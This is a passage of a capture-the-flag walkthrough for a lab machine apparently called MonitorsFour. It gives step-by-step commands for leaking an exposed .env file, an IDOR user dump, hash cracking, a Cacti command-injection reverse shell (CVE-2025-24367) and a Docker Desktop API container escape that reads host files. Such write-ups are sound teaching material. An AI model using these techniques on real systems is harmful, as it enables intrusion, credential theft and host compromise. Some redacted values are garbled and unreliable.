<th scope="col">Notes</th>
</tr>
</thead>
<tbody><tr>
<td>80</td>
<td>nginx (PHP)</td>
<td>Main web app</td>
</tr>
<tr>
<td>5985</td>
<td>WinRM</td>
<td>Windows Remote Management</td>
</tr>
</tbody></table>
<p><strong>Why:</strong> Always scan all ports (<code>-p-</code>). Port 5985 tells us the host OS is Windows even though we'll land in a Linux container — important context for privilege escalation later.</p>
<hr />
<h2 id="step-3-find-the-env-file">Step 3 — Find the .env File</h2>
<pre><code class="language-bash" data-language="bash">curl http://monitorsfour.htb/.env
</code></pre>
<p><strong>Result:</strong></p>
<pre><code>DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
</code></pre>
<p><strong>Why:</strong> <code>.env</code> files store app configuration and secrets. Developers often forget to block public access to them. Always check for <code>.env</code>, <code>.git</code>, <code>config.php</code>, <code>backup.sql</code> etc. during recon.</p>
<hr />
<h2 id="step-4-subdomain-discovery">Step 4 — Subdomain Discovery</h2>
<pre><code class="language-bash" data-language="bash">ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://monitorsfour.htb \
     -H "Host: FUZZ.monitorsfour.htb" -ac
</code></pre>
<p><strong>Result:</strong> <code>cacti.monitorsfour.htb</code></p>
<p><strong>Why:</strong> The main site may be locked down but subdomains often host internal tools (admin panels, monitoring systems) with weaker security. Always enumerate subdomains.</p>
<hr />
<h2 id="step-5-idor-via-token-redacted-user-dump">Step 5 — IDOR via token=REDACTED (User Dump)</h2>
<pre><code class="language-bash" data-language="bash"># First, find the token parameter
ffuf -u "http://monitorsfour.htb/user?FUZZ=test123" \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -t 30 -fr "Missing token parameter" -fs 0

# Then dump all users
curl -s "http://monitorsfour.htb/user?token=REDACTED
</code></pre>
<p><strong>Why this works:</strong> The backend code checks <code>if token:REDACTEDif token is REDACTED None:</code>. In many languages <code>0</code> is "falsy", so the token validation is skipped entirely and all user records are returned. This is a classic <strong>IDOR</strong> (Insecure Direct Object Reference) combined with a type juggling bug.</p>
<p><strong>Result:</strong> Full JSON dump including MD5 password hashes:</p>
<pre><code class="language-json" data-language="json">{"username":"admin","password":null,"name":"Marcus Higgins"}
</code></pre>
<hr />
<h2 id="step-6-crack-the-hash">Step 6 — Crack the Hash</h2>
<pre><code class="language-bash" data-language="bash">echo "admin:[redacted retired-lab hash or flag]" &gt; hashes.txt
john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
</code></pre>
<p><strong>Result:</strong> <code>wonderful1</code></p>
<p><strong>Why:</strong> MD5 is a broken hashing algorithm — it's fast to compute and has no salt here, making it trivially crackable with a dictionary attack. Always try john/hashcat against leaked hashes.</p>
<blockquote>
<p><strong>Note:</strong> The hash belongs to <code>admin</code> but the Cacti username is <code>marcus</code> (from the name field "Marcus Higgins"). Always try variant usernames when credential reuse is suspected.</p>
</blockquote>
<hr />
<h2 id="step-7-login-to-cacti">Step 7 — Login to Cacti</h2>
<ul>
<li>URL: <code>http://cacti.monitorsfour.htb/cacti/</code></li>
<li>Username: <code>marcus</code></li>
<li>Password: null</li>
<li>Version confirmed: <strong>Cacti 1.2.28</strong></li>
</ul>
<p><strong>Why this works:</strong> Credential reuse — the same password was set on both the main app and Cacti. Always try discovered credentials on every login form you find.</p>
<hr />
<h2 id="step-8-exploit-cve-2025-24367-cacti-rce">Step 8 — Exploit CVE-2025-24367 (Cacti RCE)</h2>
<p><strong>Vulnerability:</strong> Cacti ≤ 1.2.28 allows command injection in the Graph Template <code>right_axis_label</code> field. The value is passed unsanitized to <code>rrdtool</code>, which interprets newlines as separate commands.</p>
<p><strong>How it works:</strong></p>
<ol>
<li>Attacker injects newlines into <code>right_axis_label</code></li>
<li>Cacti passes this to rrdtool as part of a graph rendering command</li>
<li>rrdtool interprets each line as a separate command</li>
<li>One command creates an RRD file, another writes a PHP webshell</li>
<li>The PHP file ends up in the Cacti web root</li>
<li>Visiting the PHP file executes the reverse shell</li>
</ol>
<pre><code class="language-bash" data-language="bash"># Setup
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git
cd CVE-2025-24367-Cacti-PoC
python3 -m venv venv &amp;&amp; source venv/bin/activate
pip install requests beautifulsoup4

# Terminal 1 — listener
nc -lvnp 1337

# Terminal 2 — exploit (sudo needed: script binds port 80 to serve payload)
sudo venv/bin/python3 exploit.py \
  -url http://cacti.monitorsfour.htb \
  -u marcus -p wonderful1 \
  -i &lt;YOUR_TUN0_IP&gt; -l 1337
</code></pre>
<p><strong>Why sudo:</strong> The exploit spins up a temporary HTTP server on port 80 to deliver a bash reverse shell script to the target. Port 80 requires root privileges to bind.</p>
<p><strong>Expected output:</strong></p>
<pre><code>[+] Cacti Instance Found!
[+] Serving HTTP on port 80
[+] Login Successful!
[+] Got graph ID: 226
[i] Created PHP filename: xxxxx.php
[+] Got payload: /bash
[i] Created PHP filename: xxxxx.php
[+] Hit timeout, looks good for shell, check your listener!
</code></pre>
<p><strong>Shell lands as:</strong> <code>www-data</code> inside a Docker container</p>
<hr />
<h2 id="step-9-user-flag">Step 9 — User Flag</h2>
<pre><code class="language-bash" data-language="bash">cat /home/marcus/user.txt
</code></pre>
<p>The file is world-readable (mode 644) so <code>www-data</code> can read it even without being the owner.</p>
<hr />
<h2 id="step-10-container-enumeration">Step 10 — Container Enumeration</h2>
<pre><code class="language-bash" data-language="bash">hostname        # short container ID e.g. 821fbd6a43fa — confirms we're in Docker
ip addr         # container IP: 172.18.0.x
ip route        # gateway: 172.18.0.1
uname -a        # kernel shows: microsoft-standard-WSL2
</code></pre>
<p><strong>Why:</strong> Always understand where you landed. The WSL2 kernel confirms we're inside Docker Desktop on Windows — this changes the escape strategy.</p>
<hr />
<h2 id="step-11-find-the-docker-api-cve-2025-9074">Step 11 — Find the Docker API (CVE-2025-9074)</h2>
<p><strong>Vulnerability:</strong> Docker Desktop exposes its Engine API on <code>192.168.65.7:2375</code> to internal containers without authentication. This is by design in Docker Desktop's internal networking model but is exploitable.</p>
<pre><code class="language-bash" data-language="bash"># Scan the Docker Desktop internal subnet for the API
for i in $(seq 1 254); do
  (curl -s --connect-timeout 1 http://192.168.65.$i:2375/version 2&gt;/dev/null \
  | grep -q "ApiVersion" &amp;&amp; echo "192.168.65.$i OPEN") &amp;
done; wait
</code></pre>
<p><strong>Result:</strong> <code>192.168.65.7 OPEN</code></p>
<p><strong>Why 192.168.65.0/24:</strong> Docker Desktop on Windows uses this subnet for its internal WSL2 networking. <code>host.docker.internal</code> resolves to <code>.254</code> but the API is on <code>.7</code>.</p>
<pre><code class="language-bash" data-language="bash"># Confirm API access
curl http://192.168.65.7:2375/version

# List available images
curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
</code></pre>
<p><strong>Available images:</strong></p>
<ul>
<li><code>docker_setup-nginx-php:latest</code></li>
<li><code>docker_setup-mariadb:latest</code></li>
<li><code>alpine:latest</code>  ← use this</li>
</ul>
<hr />
<h2 id="step-12-docker-escape-root-flag">Step 12 — Docker Escape → Root Flag</h2>
<p><strong>Why this works:</strong> The Docker API has no authentication. We can create a new privileged container that mounts the Windows host filesystem (<code>C:\</code> drive) at <code>/mnt/host_root</code>. From inside that container we can read any file on the host — including <code>root.txt</code> on the Administrator's Desktop.</p>
<p>The path <code>/mnt/host/c</code> is how Docker Desktop on Windows exposes the host <code>C:\</code> drive to containers via WSL2.</p>
<pre><code class="language-bash" data-language="bash"># Create container with host C:\ mounted
curl -X POST http://192.168.65.7:2375/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh", "-c", "cat /mnt/host_root/Users/Administrator/Desktop/root.txt"],
    "HostConfig": {"Binds": ["/mnt/host/c:/mnt/host_root"]},
    "Tty": true
  }' \
  -o /tmp/c.json

# Extract container ID and start it
cid=$(grep -o '"Id":"[^"]*"' /tmp/c.json | cut -d'"' -f4 | cut -c1-12)
curl -X POST http://192.168.65.7:2375/containers/$cid/start

# Read root flag from container logs
sleep 2
curl "http://192.168.65.7:2375/containers/$cid/logs?stdout=true"
</code></pre>
<p><strong>Root flag returned directly in the curl response — no reverse shell needed.</strong></p>

<h2 id="lessons-learned">Lessons Learned</h2>
<ul>
<li><strong>Always check <code>.env</code>, <code>.git</code>, <code>backup</code> files</strong> — developers forget to block them</li>
<li><strong>Test falsy values</strong> (<code>0</code>, <code>-1</code>, <code>null</code>, <code>""</code>) on every token/ID parameter</li>
<li><strong>Credential reuse is extremely common</strong> — try every set of creds on every login form</li>
<li><strong>Understand your execution context</strong> — container vs host changes everything</li>
<li><strong>Docker Desktop has a unique network model</strong> — <code>192.168.65.0/24</code> is the internal subnet</li>
<li><strong>Unauthenticated Docker API = full host compromise</strong> — always scan internal subnets from inside containers</li>
<li><strong>Machine state matters for exploits</strong> — stale RRD files from failed attempts can block re-exploitation; reset the machine for a clean run</li>
</ul>
